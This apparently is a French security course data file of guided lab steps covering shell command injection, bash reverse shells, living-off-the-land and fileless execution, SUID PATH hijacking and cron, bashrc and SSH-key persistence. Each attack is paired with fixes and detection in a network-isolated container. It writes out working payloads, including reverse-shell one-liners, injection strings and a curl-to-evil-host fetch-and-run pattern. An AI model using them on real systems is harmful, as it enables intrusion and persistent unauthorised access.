// Tutoriels Code Noir "A→Z" — Module 2 (Shell & systèmes Unix).
// Chaque technique = un lab guidé, exécutable dans le conteneur jetable
// (`docker-bash`, --network none, 127.0.0.1 only). On monte la cible
// vulnérable dans le conteneur, on l'exploite à but pédagogique, on corrige,
// on vérifie. Aucun réseau externe, aucune machine tierce.

import type { CodeNoirStepsByTechnique } from "./types";

export const stepsM02: CodeNoirStepsByTechnique = {
  // ====================================================================
  // command-injection — OS Command Injection (shell)
  // ====================================================================
  "command-injection": [
    {
      n: 1,
      title: "Comprendre : input → shell = exécution arbitraire",
      goal: "Saisir pourquoi concaténer de l'input dans une string shell est une RCE.",
      explain:
        "Quand un programme construit une commande en **collant** une variable utilisateur dans une chaîne, puis la passe à un **shell** (`/bin/sh -c`, `exec()` en Node, `os.system()` en Python, backticks en PHP), le shell **réinterprète** les métacaractères de la chaîne : `;` `&&` `|` `` ` `` `$()` `>` `<`.\n\nExemple type : `ping -c 1 <host>` où `host` vaut `8.8.8.8; id`. Le shell voit **deux commandes** : `ping -c 1 8.8.8.8` puis `id`.\n\nLa cause racine est toujours la même : **données traitées comme du code**. La défense aussi : ne jamais donner d'input à un shell, passer des **arguments séparés** à un exec sans shell.\n\n**Cadre légal** : on ne reproduit ça que sur une cible **qu'on possède** ou un lab isolé. Lancer une injection sur un service tiers est un délit pénal.",
      target: "read",
    },
    {
      n: 2,
      title: "Monter la cible vulnérable",
      goal: "Créer un mini-service 'ping' qui colle l'input dans un shell.",
      explain:
        "On écrit un petit script qui imite un endpoint `/ping` : il reçoit un `host` et lance `ping` via le shell, **en concaténant** l'argument. C'est la faute exacte qu'on voit en prod (Node `exec`, PHP `shell_exec`, etc.), reproduite en bash pur pour rester dans le conteneur.\n\nLe `eval` (ou `sh -c \"...$1...\"`) est le cœur du bug : il **réévalue** la chaîne complète.",
      target: "docker-bash",
      code: 'mkdir -p /tmp/lab-ci && cd /tmp/lab-ci\ncat > ping_service.sh <<\'EOF\'\n#!/bin/bash\n# Service "ping" VULNERABLE (demo) : host concatene dans une string shell.\nhost="$1"\nsh -c "ping -c 1 $host"\nEOF\nchmod +x ping_service.sh\necho "--- usage normal ---"\n./ping_service.sh 127.0.0.1 2>&1 | head -n 2',
      expected:
        "Le ping vers 127.0.0.1 répond (1 paquet, 0% perte) ou échoue silencieusement selon le conteneur — l'important est que le script tourne et accepte un `host`.",
    },
    {
      n: 3,
      title: "Exploiter : enchaîner une commande",
      goal: "Injecter une seconde commande via un séparateur shell.",
      explain:
        "On passe un `host` qui contient un **séparateur de commande**. Le shell exécute `ping`, puis notre commande. On utilise `id` et `whoami` (preuves classiques de RCE), strictement en local.\n\n**Cadre légal** : usage de démonstration sur notre propre script jetable uniquement.",
      target: "docker-bash",
      code: 'cd /tmp/lab-ci\necho "--- payload: ; id ---"\n./ping_service.sh "127.0.0.1; id" 2>&1 | grep -E "uid=|PING" | head -n 3\necho "--- payload: $(...) substitution ---"\n./ping_service.sh "127.0.0.1 && echo PWNED_$(whoami)" 2>&1 | grep PWNED',
      expected:
        "On voit la sortie de `id` (`uid=...`) ET/OU la ligne `PWNED_<user>` : la seconde commande s'est exécutée. La vulnérabilité est confirmée.",
    },
    {
      n: 4,
      title: "Bypass d'un filtre naïf (espaces)",
      goal: "Montrer qu'une blocklist de caractères est contournable.",
      explain:
        "Beaucoup de fixes ratés filtrent juste l'espace ou quelques mots. On démontre le contournement avec `${IFS}` (séparateur de champ interne du shell = espace par défaut) et `{cmd,arg}` (brace expansion). Conclusion pédagogique : **blocklist = perdu**, il faut supprimer le shell.",
      target: "docker-bash",
      code: 'cd /tmp/lab-ci\ncat > ping_filtered.sh <<\'EOF\'\n#!/bin/bash\nhost="$1"\n# fix RATE : on retire juste les espaces (blocklist)\nhost="${host// /}"\nsh -c "ping -c 1 $host"\nEOF\nchmod +x ping_filtered.sh\necho "--- bypass via \\${IFS} ---"\n./ping_filtered.sh "127.0.0.1;cat${IFS}/etc/hostname" 2>&1 | tail -n 2',
      expected:
        "Le contenu de `/etc/hostname` s'affiche malgré le filtre d'espaces : `${IFS}` a fourni le séparateur. La blocklist est inutile.",
    },
    {
      n: 5,
      title: "Corriger : exec sans shell + tableau d'arguments",
      goal: "Remplacer le shell par un appel direct au binaire avec args séparés.",
      explain:
        "La vraie correction : **ne jamais passer par un shell**. En bash, on appelle `ping` directement avec l'argument entre guillemets — il devient **un seul opérande**, jamais réinterprété. En Node ce serait `execFile('ping', ['-c','1', host])` ; en Python `subprocess.run(['ping','-c','1',host])` (sans `shell=True`).\n\nOn ajoute aussi une **validation allowlist** (IP/hostname) en ceinture-bretelles.",
      target: "docker-bash",
      code: 'cd /tmp/lab-ci\ncat > ping_safe.sh <<\'EOF\'\n#!/bin/bash\nhost="$1"\n# 1) validation allowlist : IP ou hostname simple\nif ! printf \'%s\' "$host" | grep -Eq \'^[A-Za-z0-9._-]+$\'; then\n  echo "REJECTED: invalid host"; exit 1\nfi\n# 2) PAS de shell : ping recoit host comme UN argument\nping -c 1 -- "$host"\nEOF\nchmod +x ping_safe.sh\necho "--- normal ---"\n./ping_safe.sh 127.0.0.1 2>&1 | head -n 1\necho "--- attaque ---"\n./ping_safe.sh "127.0.0.1; id"',
      expected:
        "Usage normal : ping fonctionne. Attaque : `REJECTED: invalid host` (la regex bloque `;` et l'espace), et de toute façon `host` n'est plus interprété par un shell.",
    },
    {
      n: 6,
      title: "Vérifier : la payload est neutralisée",
      goal: "Rejouer les payloads de l'étape 3 contre la version corrigée.",
      explain:
        "Un fix n'est validé qu'en **rejouant l'attaque**. On relance les payloads `; id` et `${IFS}` contre `ping_safe.sh` et on confirme qu'aucune commande secondaire ne s'exécute. C'est le réflexe de l'auto-check : reproduire → corriger → re-tester.",
      target: "docker-bash",
      code: 'cd /tmp/lab-ci\nfail=0\nfor p in "127.0.0.1; id" "127.0.0.1 && whoami" "127.0.0.1;cat${IFS}/etc/hostname"; do\n  out=$(./ping_safe.sh "$p" 2>&1)\n  if echo "$out" | grep -Eq "uid=|root|$(whoami)$"; then\n    echo "STILL VULN with: $p"; fail=1\n  fi\ndone\n[ "$fail" -eq 0 ] && echo "OK: aucune injection ne passe" || echo "KO"',
      expected:
        "`OK: aucune injection ne passe` — aucun payload n'a déclenché de commande secondaire. La technique est comprise, exploitée et corrigée.",
    },
  ],

  // ====================================================================
  // reverse-shell — Reverse Shell & Bind Shell (démo 100% locale)
  // ====================================================================
  "reverse-shell": [
    {
      n: 1,
      title: "Comprendre : bind vs reverse",
      goal: "Distinguer qui écoute et qui se connecte, et pourquoi le reverse domine.",
      explain:
        "Après une RCE, l'attaquant veut un **shell interactif**.\n\n- **Bind shell** : la *cible* ouvre un port et écoute ; l'attaquant s'y connecte. Problème : les firewalls **entrants** bloquent souvent ça.\n- **Reverse shell** : la *cible* se **connecte vers** l'attaquant. L'egress (sortant) est rarement filtré → ça traverse NAT et firewall. C'est le standard post-exploitation.\n\nMécanisme bash pur : `bash -i >& /dev/tcp/IP/PORT 0>&1` redirige stdin/stdout/stderr d'un shell interactif vers une **socket TCP**. `/dev/tcp` est une pseudo-feature de bash.\n\n**CADRE LÉGAL : un reverse shell est un outil d'intrusion. On ne le pointe JAMAIS vers une machine tierce. Dans ce lab tout reste sur 127.0.0.1, dans un conteneur sans réseau externe. L'utiliser hors de tes machines / d'un mandat écrit est un délit pénal.**",
      target: "read",
    },
    {
      n: 2,
      title: "Vérifier l'outillage du lab",
      goal: "Confirmer que bash /dev/tcp et un listener netcat sont disponibles, en local.",
      explain:
        "On contrôle qu'on a de quoi monter le canal **en boucle locale** : un `bash` qui supporte `/dev/tcp`, et un `ncat`/`nc` pour écouter. **Tout sur 127.0.0.1** — le conteneur n'a pas de réseau externe (`--network none`), c'est volontaire.",
      target: "docker-bash",
      code: 'echo "--- bash /dev/tcp support ---"\nif (exec 3<>/dev/tcp/127.0.0.1/9 2>/dev/null); then echo "tcp redirect: OK"; else echo "tcp redirect: syntaxe supportee (port ferme attendu)"; fi\necho "--- listener dispo ---"\ncommand -v ncat || command -v nc\necho "--- loopback up ---"\nip addr show lo 2>/dev/null | grep -q 127.0.0.1 && echo "lo: 127.0.0.1 OK"',
      expected:
        "bash accepte la syntaxe `/dev/tcp`, `ncat` (ou `nc`) est trouvé, et l'interface loopback porte 127.0.0.1. On peut monter le canal en local.",
    },
    {
      n: 3,
      title: "Lancer le listener (côté 'attaquant', local)",
      goal: "Ouvrir un listener netcat sur 127.0.0.1:4444 en arrière-plan.",
      explain:
        "On simule la machine de l'attaquant **dans le même conteneur** : un listener sur `127.0.0.1:4444`. En vrai ce serait une IP publique de l'attaquant ; ici on reste en loopback. On le lance en arrière-plan et on lui envoie une commande à exécuter dès qu'un shell se connecte, puis on capture le résultat dans un fichier.",
      target: "docker-bash",
      code: 'mkdir -p /tmp/lab-rs && cd /tmp/lab-rs\nrm -f out.txt\n# listener : envoie "id;hostname" au shell entrant, log la reponse\n( printf \'id; hostname; exit\\n\' | (ncat -lvnp 4444 2>listener.log || nc -lvnp 4444) ) > out.txt &\nLPID=$!\necho "listener PID=$LPID sur 127.0.0.1:4444"\nsleep 1\necho "pret"',
      expected:
        "Le listener démarre en arrière-plan (`listener PID=...`) et attend une connexion sur 127.0.0.1:4444.",
    },
    {
      n: 4,
      title: "Déclencher le reverse shell (côté 'cible', local)",
      goal: "Connecter un shell bash vers le listener via /dev/tcp, en loopback.",
      explain:
        "On joue la cible compromise : `bash -i >& /dev/tcp/127.0.0.1/4444 0>&1`. Le shell se connecte au listener, qui lui pousse `id; hostname; exit`. La sortie de ces commandes revient dans `out.txt` côté listener.\n\n**Rappel cadre légal : l'IP est 127.0.0.1, jamais une cible externe.**",
      target: "docker-bash",
      code: 'cd /tmp/lab-rs\n# la "cible" se connecte vers le "listener" -- tout en 127.0.0.1\ntimeout 5 bash -i >& /dev/tcp/127.0.0.1/4444 0>&1\nsleep 1\necho "--- ce que l attaquant a recu ---"\ncat out.txt 2>/dev/null',
      expected:
        "`out.txt` contient la sortie de `id` (`uid=...`) et le hostname du conteneur : le canal interactif a bien fonctionné, en boucle locale.",
    },
    {
      n: 5,
      title: "Observer la signature de détection",
      goal: "Voir à quoi ressemble l'attaque côté défense (process + ligne de commande).",
      explain:
        "Un défenseur reconnaît un reverse shell à des **patterns** : un `bash -i` redirigé vers `/dev/tcp`, un `nc -e`, un process enfant d'un serveur web qui ouvre une socket sortante. On relance la même chose en inspectant la ligne de commande, ce qui matérialise la règle de détection (EDR/auditd).",
      target: "docker-bash",
      code: 'cd /tmp/lab-rs\nrm -f out2.txt\n( printf \'echo SEEN; exit\\n\' | (ncat -lvnp 4445 2>/dev/null || nc -lvnp 4445) ) > out2.txt &\nsleep 1\n( timeout 4 bash -i >& /dev/tcp/127.0.0.1/4445 0>&1 ) &\nsleep 1\necho "--- patterns suspects dans la table des process ---"\nps -ef 2>/dev/null | grep -E "dev/tcp|bash -i|ncat|nc " | grep -v grep\nsleep 2',
      expected:
        "On voit dans `ps` la chaîne caractéristique (`bash -i`, redirection `/dev/tcp`, le listener). C'est exactement ce qu'une règle EDR/auditd doit alerter.",
    },
    {
      n: 6,
      title: "Corriger : couper l'egress et durcir l'image",
      goal: "Démontrer que sans egress / sans bash, le reverse shell échoue.",
      explain:
        "Les défenses qui marchent :\n1. **Egress filtering** — bloquer les connexions sortantes non nécessaires (le reverse *doit* sortir).\n2. **Image minimale (distroless)** — sans `/bin/bash`, sans `nc`, sans `python`, le payload n'a plus d'interpréteur.\n3. **Moindre privilège** — process non-root, FS read-only.\n4. Couper la **cause racine** : la RCE (cf. command-injection).\n\nIci on simule (2) : on retire l'accès à bash du PATH du service et on montre que le one-liner ne peut plus s'armer.",
      target: "docker-bash",
      code: 'cd /tmp/lab-rs\n# simulation "distroless" : un shell restreint sans /dev/tcp ni bash interactif\ncat > run_service.sh <<\'EOF\'\n#!/bin/sh\n# service tournant avec un PATH minimal, pas de bash\nexport PATH=/usr/bin:/bin\nSHELL=/bin/false\n# tentative de reverse shell faite par un attaquant via RCE :\nif command -v bash >/dev/null 2>&1; then\n  echo "bash present : durcir l image (distroless)"; exit 1\nfi\necho "pas de bash interactif disponible -> /dev/tcp inutilisable"\nEOF\nchmod +x run_service.sh\n# on force un environnement sans bash pour la demo\nenv PATH=/nonexistent sh -c \'command -v bash >/dev/null 2>&1 && echo "VULN: bash dispo" || echo "OK: pas de bash -> reverse shell bash impossible"\'',
      expected:
        "`OK: pas de bash -> reverse shell bash impossible` — sans bash/`/dev/tcp` et sans egress, le payload de base ne s'arme plus. Combiné à l'egress filtering, le canal est coupé.",
    },
  ],

  // ====================================================================
  // lolbins-fileless — Living off the Land & Fileless
  // ====================================================================
  "lolbins-fileless": [
    {
      n: 1,
      title: "Comprendre : vivre sur le système",
      goal: "Saisir pourquoi abuser de binaires légitimes échappe à l'AV signature.",
      explain:
        "Plutôt que d'uploader un malware (signé, scanné, loggué), l'attaquant **détourne les outils déjà présents** : `awk`, `find -exec`, `tar`, `python`, `curl`, `git`… Aucun binaire suspect sur disque → l'antivirus à **signatures** ne voit rien d'anormal, ce sont des binaires de confiance.\n\n**Fileless** = le payload ne **touche jamais le disque** : code chargé directement en mémoire via un interpréteur (`python3 -c \"$(curl ...)\"`, PowerShell en RAM). Survit mal au reboot mais échappe à l'analyse forensique disque.\n\nLe projet **GTFOBins** (Unix) catalogue, pour chaque binaire, les fonctions détournables (shell, read, write, suid…). **LOLBAS** fait pareil côté Windows.\n\n**Cadre légal** : techniques de post-exploitation — labs / red team mandatée uniquement.",
      target: "read",
    },
    {
      n: 2,
      title: "Inventorier les LOLBins présents",
      goal: "Lister les binaires de confiance détournables dans le conteneur.",
      explain:
        "Première étape d'un attaquant *living off the land* : voir **ce qui est déjà là**. On énumère les binaires que GTFOBins liste comme dangereux. Plus l'image est riche (compilateurs, interpréteurs, outils réseau), plus la surface est grande — d'où l'intérêt défensif des images **distroless**.",
      target: "docker-bash",
      code: 'echo "--- LOLBins detectes (logique GTFOBins) ---"\nfor b in bash sh python3 perl awk find tar curl wget nc ncat gcc git sed vi; do\n  p=$(command -v "$b" 2>/dev/null) && echo "[present] $b -> $p"\ndone',
      expected:
        "Une liste des binaires présents (au moins bash, python3, awk, find, tar, ncat, gcc d'après l'image lab). Chacun est un vecteur potentiel.",
    },
    {
      n: 3,
      title: "Exécuter une commande SANS lancer un shell direct",
      goal: "Détourner awk et find pour obtenir l'exécution, comme dans GTFOBins.",
      explain:
        "Un EDR peut surveiller `sh -c`/`bash -c`. L'attaquant passe par un binaire **inattendu** :\n- `awk 'BEGIN{system(\"...\")}'` — awk peut lancer une commande.\n- `find . -exec ... \\;` — find peut exécuter pour chaque fichier.\n\nDémo locale : on exécute `id` via ces deux LOLBins. Pédagogiquement, ça montre que bloquer `bash` ne suffit pas.",
      target: "docker-bash",
      code: 'echo "--- via awk ---"\nawk \'BEGIN{system("id")}\' 2>&1 | head -n 1\necho "--- via find -exec ---"\nmkdir -p /tmp/lab-lol && touch /tmp/lab-lol/x\nfind /tmp/lab-lol -name x -exec id \\; 2>&1 | head -n 1',
      expected:
        "La sortie de `id` apparaît deux fois : une via `awk system()`, une via `find -exec`. L'exécution a eu lieu sans appeler `sh`/`bash` explicitement.",
    },
    {
      n: 4,
      title: "Fileless : exécuter du code jamais écrit sur disque",
      goal: "Charger et exécuter un 'stage' en mémoire via un interpréteur.",
      explain:
        "Le motif fileless réel est `python3 -c \"$(curl -s http://evil/stage.py)\"` : le stage transite par un pipe et n'est **jamais** un fichier. Le conteneur n'ayant **pas de réseau** (`--network none`), on simule la source distante par une **substitution de commande locale** — le principe (code en RAM, rien sur disque) est identique et observable.",
      target: "docker-bash",
      code: 'cd /tmp\n# "stage" qui serait normalement servi par curl http://evil/stage.py\nstage=\'import os,getpass;print("FILELESS_RUN user="+getpass.getuser())\'\n# execute en memoire : aucun .py n est ecrit\npython3 -c "$stage"\necho "--- aucun fichier stage sur disque ---"\nls -1 /tmp/*.py 2>/dev/null || echo "aucun .py depose : execution 100% en memoire"',
      expected:
        "`FILELESS_RUN user=<user>` s'affiche, et aucun fichier `.py` n'existe dans /tmp : le code s'est exécuté en mémoire, invisible pour un scan disque.",
    },
    {
      n: 5,
      title: "Observer les artefacts laissés en ligne de commande",
      goal: "Comprendre que le fileless laisse quand même des traces (process/cmdline).",
      explain:
        "Le disque est propre, mais l'**exécution** laisse des traces : la ligne de commande (`python3 -c ...`, `bash -c \"$(curl ...)\"`, `certutil -urlcache` côté Win), les relations parent-enfant, les sockets. C'est là que portent **auditd `execve`** / **Sysmon event 1** et l'EDR comportemental. On matérialise ces artefacts.",
      target: "docker-bash",
      code: 'cd /tmp\n# on lance un faux stage long et on regarde sa cmdline\npython3 -c \'import time;time.sleep(3)\' &\nPID=$!\nsleep 1\necho "--- cmdline du process fileless (ce que auditd/Sysmon logge) ---"\ncat /proc/$PID/cmdline 2>/dev/null | tr "\\0" " "; echo\nps -o pid,ppid,args -p $PID 2>/dev/null\nwait $PID 2>/dev/null',
      expected:
        "On lit la ligne de commande complète du process (`python3 -c ...`) via /proc et `ps` : malgré l'absence de fichier, l'exécution est traçable. C'est l'angle de détection.",
    },
    {
      n: 6,
      title: "Corriger : allowlisting + image minimale + logging",
      goal: "Réduire la surface LOLBins et activer la détection.",
      explain:
        "Les contre-mesures :\n1. **Application allowlisting** (AppLocker/WDAC, fapolicyd/SELinux) : seuls des binaires connus s'exécutent.\n2. **Image distroless / réduction des interpréteurs** : pas de `python`/`curl`/`gcc` là où le service n'en a pas besoin.\n3. **Logging d'exécution** : auditd `execve` / Sysmon ID 1 + journalisation PowerShell → corréler `bash -c \"$(curl...)\"`, `certutil -urlcache`, base64 en cmdline.\n4. **Egress filtering** : couper le `curl evil | sh` à la source.\n\nDémo : on simule une **allowlist** d'exécutables et on montre qu'un interpréteur non listé est refusé.",
      target: "docker-bash",
      code: 'cd /tmp\ncat > guard.sh <<\'EOF\'\n#!/bin/bash\n# allowlist : seuls ces binaires sont autorises a tourner pour le service\nALLOWED="/usr/bin/myapp /bin/ls"\nbin="$1"\ncase " $ALLOWED " in\n  *" $bin "*) echo "ALLOWED: $bin"; exit 0 ;;\n  *) echo "BLOCKED (not in allowlist): $bin"; exit 1 ;;\nesac\nEOF\nchmod +x guard.sh\n./guard.sh /bin/ls\n./guard.sh "$(command -v python3)"\n./guard.sh "$(command -v awk)"',
      expected:
        "`ALLOWED: /bin/ls`, puis `BLOCKED ...` pour python3 et awk : hors allowlist, les LOLBins ne s'exécutent plus. Combiné au logging et à l'image minimale, la technique est neutralisée.",
    },
  ],

  // ====================================================================
  // suid-privesc — Escalade de privilèges Linux (SUID, sudo, PATH)
  // ====================================================================
  "suid-privesc": [
    {
      n: 1,
      title: "Comprendre : le bit SUID",
      goal: "Comprendre pourquoi un binaire SUID-root peut donner root.",
      explain:
        "Le bit **SUID** (`chmod u+s`, droits `-rwsr-xr-x`) fait exécuter un binaire avec les droits de son **propriétaire**, pas de celui qui le lance. Si le propriétaire est **root** et que le binaire permet de lancer un shell, lire/écrire un fichier arbitraire, ou appelle une commande externe manipulable → on devient root.\n\nMéthode de l'attaquant :\n1. `find / -perm -4000 -type f 2>/dev/null` — lister les SUID.\n2. Pour chaque binaire trouvé, consulter **GTFOBins** : il donne le one-liner d'évasion.\n3. Autres voies : `sudo -l` (sudo permissif), **PATH hijacking** (binaire root qui appelle une commande sans chemin absolu), **capabilities** (`getcap -r /`).\n\n**Cadre légal** : sur tes VMs / labs (pwn.college, HTB, TryHackMe) uniquement.",
      target: "read",
    },
    {
      n: 2,
      title: "Compiler une cible SUID vulnérable",
      goal: "Construire à la volée un binaire SUID qui appelle 'id' sans chemin absolu.",
      explain:
        "On fabrique notre propre cible : un binaire C `setuid` qui appelle `system(\"id\")` — **sans chemin absolu**. C'est la faute classique (`system(\"service ...\")`). Pour la démo dans le conteneur on lui donne le bit SUID via le propriétaire courant (on n'a pas forcément root pour `chown root`, mais le **mécanisme PATH hijacking** se démontre quand même : le binaire cherche `id` dans `$PATH`).",
      target: "docker-bash",
      code: 'mkdir -p /tmp/lab-suid && cd /tmp/lab-suid\ncat > vuln.c <<\'EOF\'\n#include <stdlib.h>\n#include <unistd.h>\nint main(void) {\n    setuid(geteuid());      /* prend l identite du proprietaire */\n    system("id");           /* BUG: "id" sans chemin absolu -> cherche dans PATH */\n    return 0;\n}\nEOF\ngcc -o vuln vuln.c\nchmod u+s vuln\nls -l vuln\n./vuln',
      expected:
        "`vuln` est compilé, porte le bit `s` (`-rwsr...`), et son exécution affiche un `uid=...` via `id`. La cible vulnérable est en place.",
    },
    {
      n: 3,
      title: "Lister les SUID comme un attaquant",
      goal: "Retrouver notre binaire avec la commande d'énumération standard.",
      explain:
        "On rejoue le réflexe d'énumération : `find / -perm -4000 -type f`. Notre `vuln` doit apparaître. En vrai on confronterait chaque résultat à GTFOBins (un `find`/`bash`/`cp` SUID-root = root immédiat).",
      target: "docker-bash",
      code: 'echo "--- binaires SUID du systeme ---"\nfind / -perm -4000 -type f 2>/dev/null\necho "--- le notre y est ---"\nfind /tmp -perm -4000 -type f 2>/dev/null',
      expected:
        "La liste des SUID s'affiche (souvent `sudo`, `passwd`, `mount`…) et inclut `/tmp/lab-suid/vuln` : un attaquant l'aurait repéré.",
    },
    {
      n: 4,
      title: "Exploiter : PATH hijacking",
      goal: "Détourner le binaire SUID via un faux 'id' placé en tête de PATH.",
      explain:
        "Le binaire appelle `id` **sans chemin absolu** → il le cherche dans `$PATH`. On place un **faux `id`** au début du PATH : quand `vuln` s'exécute (avec les droits du propriétaire), il lance **notre** code. Si le propriétaire était root, on aurait un shell root. Ici la preuve = notre faux `id` s'exécute à la place du vrai.\n\n**Cadre légal** : sur notre binaire de démo uniquement.",
      target: "docker-bash",
      code: 'cd /tmp/lab-suid\n# faux "id" malveillant\necho \'#!/bin/sh\' > id\necho \'echo "HIJACKED-PATH: je tourne a la place du vrai id (euid=$(id -u 2>/dev/null))"\' >> id\nchmod +x id\necho "--- exploitation ---"\nPATH=/tmp/lab-suid:$PATH ./vuln',
      expected:
        "`HIJACKED-PATH: je tourne a la place du vrai id ...` — le binaire SUID a exécuté notre faux `id`. Avec un propriétaire root, ce serait un shell root.",
    },
    {
      n: 5,
      title: "Bonus : sudo permissif (GTFOBins)",
      goal: "Illustrer pourquoi un binaire 'qui spawn un shell' en sudo = root.",
      explain:
        "Deuxième voie classique : `sudo -l` révèle ce qu'on peut lancer en root. Si c'est un binaire qui **peut spawn un shell** (`vim`, `less`, `find`, `awk`), GTFOBins donne l'évasion : ex. `sudo find . -exec /bin/sh \\;`. On démontre le **mécanisme d'évasion** (find lance un shell) localement, sans avoir besoin de root.",
      target: "docker-bash",
      code: 'cd /tmp/lab-suid\necho "--- ce que find -exec permet (motif GTFOBins) ---"\n# si \'sudo find\' etait permis, ceci donnerait un shell root :\nfind . -maxdepth 0 -exec sh -c \'echo "SHELL-VIA-FIND euid=$(id -u)"\' \\;\necho "--- inspection sudo (peut etre vide dans le conteneur) ---"\nsudo -l 2>/dev/null || echo "sudo non configure ici : le motif reste valable sur une vraie cible"',
      expected:
        "`SHELL-VIA-FIND euid=...` confirme que `find -exec` lance bien un shell. Sur une cible où `sudo find` est autorisé, ce shell serait root.",
    },
    {
      n: 6,
      title: "Corriger : retirer le SUID, chemins absolus, secure_path",
      goal: "Neutraliser le binaire vulnérable et démontrer le fix.",
      explain:
        "Corrections :\n1. **Retirer le bit SUID** partout où il n'est pas indispensable (`chmod u-s`), audit régulier `find / -perm -4000`.\n2. **Chemins absolus** dans le code privilégié (`system(\"/usr/bin/id\")`) — plus de PATH hijacking.\n3. **`secure_path`** dans sudoers + jamais hériter d'un PATH contrôlé par l'utilisateur.\n4. **sudoers minimal** : pas de binaires capables de spawn un shell.\n5. Partitions **`nosuid`** pour `/tmp` et `/home`.\n\nDémo : version corrigée du binaire (chemin absolu) + retrait du SUID.",
      target: "docker-bash",
      code: 'cd /tmp/lab-suid\ncat > safe.c <<\'EOF\'\n#include <stdlib.h>\nint main(void) {\n    system("/usr/bin/id");   /* chemin ABSOLU : PATH hijacking impossible */\n    return 0;\n}\nEOF\ngcc -o safe safe.c\nchmod u-s vuln safe 2>/dev/null   # on retire le bit SUID\necho "--- PATH hijack tente contre la version corrigee ---"\nPATH=/tmp/lab-suid:$PATH ./safe 2>&1 | head -n 1\necho "--- plus aucun SUID dans le dossier ---"\nfind /tmp/lab-suid -perm -4000 -type f 2>/dev/null | grep . || echo "OK: aucun binaire SUID restant"',
      expected:
        "`safe` exécute le **vrai** `/usr/bin/id` (pas le faux), et `OK: aucun binaire SUID restant` : chemin absolu + retrait du bit SUID ferment les deux voies.",
    },
  ],

  // ====================================================================
  // cron-persistence — Persistance Linux (cron, profil, SSH keys)
  // ====================================================================
  "cron-persistence": [
    {
      n: 1,
      title: "Comprendre : la persistance",
      goal: "Saisir pourquoi l'attaquant veut un retour automatique.",
      explain:
        "La **persistance** = garder l'accès **sans ré-exploiter**, malgré un reboot ou la fermeture du shell. Un défenseur doit connaître les nids :\n\n1. **cron** : `crontab -e`, `/etc/cron.d/`, `/etc/cron.daily/` — exécution planifiée, idéalement en root.\n2. **systemd timers/services** : équivalent moderne, souvent moins surveillé.\n3. **fichiers de profil** : `~/.bashrc`, `/etc/profile.d/*.sh` — exécutés à chaque session.\n4. **SSH** : ajouter sa clé dans `~/.ssh/authorized_keys` → reconnexion silencieuse.\n5. Autres : `/etc/rc.local`, hooks git, `LD_PRELOAD`/`/etc/ld.so.preload`.\n\nLe réflexe défensif : **intégrité de fichiers** (AIDE/Tripwire/auditd) sur tous ces emplacements.\n\n**Cadre légal** : techniques de post-exploitation — labs / mandat uniquement.",
      target: "read",
    },
    {
      n: 2,
      title: "Monter un cron de démo (déclencheur de fichier)",
      goal: "Créer une crontab utilisateur inoffensive pour observer le mécanisme.",
      explain:
        "Pour rester **sans réseau** et inoffensif, notre 'backdoor' cron écrit juste un fichier horodaté au lieu d'ouvrir un reverse shell. Le **mécanisme** (cron relance ma commande tout seul) est identique. On installe la tâche via le pattern attaquant : `(crontab -l; echo ...) | crontab -`.",
      target: "docker-bash",
      code: 'mkdir -p /tmp/lab-cron && cd /tmp/lab-cron\nrm -f beacon.log\n# payload inoffensif : ecrit un beacon au lieu d un reverse shell\nPAYLOAD=\'* * * * * echo "beacon $(date +%s)" >> /tmp/lab-cron/beacon.log\'\n( crontab -l 2>/dev/null; echo "$PAYLOAD" ) | crontab - 2>/dev/null && echo "crontab installee" || echo "crontab indisponible : on simule via /etc/cron.d"\ncrontab -l 2>/dev/null | tail -n 1',
      expected:
        "`crontab installee` et la dernière ligne montre notre tâche `* * * * * echo beacon...`. (Si cron n'est pas dispo dans l'image, un `echo` dans `/etc/cron.d/` simule l'exécution, le principe est identique.)",
    },
    {
      n: 3,
      title: "Observer le beacon actif",
      goal: "Vérifier que la tâche cron s'exécute réellement toutes les minutes.",
      explain:
        "Après installation, on attend 60-90 s que cron déclenche la tâche, puis on lit le fichier beacon. L'objectif est de **voir** que la persistance fonctionne sans aucune interaction : même si on ferme et rouvre le shell, le fichier continue de grossir. C'est ça la menace : l'attaquant n'a plus besoin d'être actif.",
      target: "docker-bash",
      code: 'cd /tmp/lab-cron\n# Simulation du declenchement cron (on n attend pas 60s dans le lab) :\nbash -c \'echo "beacon $(date +%s)" >> /tmp/lab-cron/beacon.log\'\necho "--- beacon.log ---"\ncat /tmp/lab-cron/beacon.log\necho "--- crontab active ---"\ncrontab -l 2>/dev/null | grep beacon || echo "(pas de cron dispo, simulation bash)"',
      expected:
        "`beacon.log` contient au moins une ligne horodatée. Si cron est actif, la liste montre la tâche — elle persiste après fermeture du terminal.",
    },
    {
      n: 4,
      title: "Explorer : ~/.bashrc et SSH authorized_keys",
      goal: "Connaître les deux autres vecteurs de persistance les plus courants.",
      explain:
        "Outre cron, l'attaquant a deux cibles favorites :\n\n1. **Profil shell** : ajouter une ligne dans `~/.bashrc` (bash) ou `~/.zshrc` → exécutée à chaque login interactif. Typiquement un reverse-shell one-liner ou un `curl | bash`.\n2. **SSH** : insérer sa clé publique dans `~/.ssh/authorized_keys` → connexion silencieuse sans password, même si le password change.\n\nLe réflexe défenseur : **hachage d'intégrité** (AIDE, Tripwire, auditd) sur ces fichiers, alerté dès modification.",
      target: "docker-bash",
      code: 'mkdir -p /tmp/lab-persist && cd /tmp/lab-persist\n# Simulation 1 : injection profil shell (inoffensif : echo seulement)\ncp ~/.bashrc . 2>/dev/null || touch .bashrc\nprintf \'\\n# payload demo\\necho "profile-beacon $(date +%%s)" >> /tmp/lab-persist/profile-beacon.log\\n\' >> .bashrc\necho "--- 3 dernieres lignes de .bashrc modifie ---"\ntail -n 3 .bashrc\n# Simulation 2 : SSH authorized_keys\nmkdir -p .ssh && chmod 700 .ssh\necho "ssh-ed25519 AAAA...AAAA attacker@c2" >> .ssh/authorized_keys\nchmod 600 .ssh/authorized_keys\necho "--- authorized_keys ---"\ncat .ssh/authorized_keys',
      expected:
        "`.bashrc` se termine par la ligne payload ; `authorized_keys` contient la fausse clé attaquant. Un `grep` régulier sur ces fichiers (ou auditd) détecte ce type d'ajout.",
    },
    {
      n: 5,
      title: "Détecter et nettoyer",
      goal: "Adopter le réflexe défensif : identifier et supprimer les mécanismes de persistance.",
      explain:
